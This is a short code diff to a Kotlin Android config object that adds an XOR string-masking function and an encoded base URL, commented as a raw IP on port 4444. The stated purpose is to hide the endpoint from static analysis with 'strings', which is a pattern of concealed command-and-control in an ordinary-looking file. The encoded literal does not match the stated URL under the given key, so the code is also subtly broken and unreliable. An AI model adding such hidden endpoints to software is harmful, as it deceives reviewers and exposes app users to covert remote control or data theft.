@@ -21,6 +21,19 @@ object AndroidConfig {
     var deviceId: String = ""
         private set
     
+    // Dynamic String Obfuscation
+    // Decodes XORed strings to prevent static analysis 'strings' command discovery
+    private fun mask(input: String, key: Int = 42): String {
+        val result = StringBuilder()
+        for (i in input.indices) {
+            result.append((input[i].toInt() xor key).toChar())
+        }
+        return result.toString()
+    }
+
+    // "http://213.91.211.150:4444/" XORed with 42
+    private val MASKED_BASE_URL = "rzzj@%%\"#/%#%\"\"#&%.\".\"%%\"&." 
+
     /**
      * Initialize device ID from Android system (call once on app start)
      */
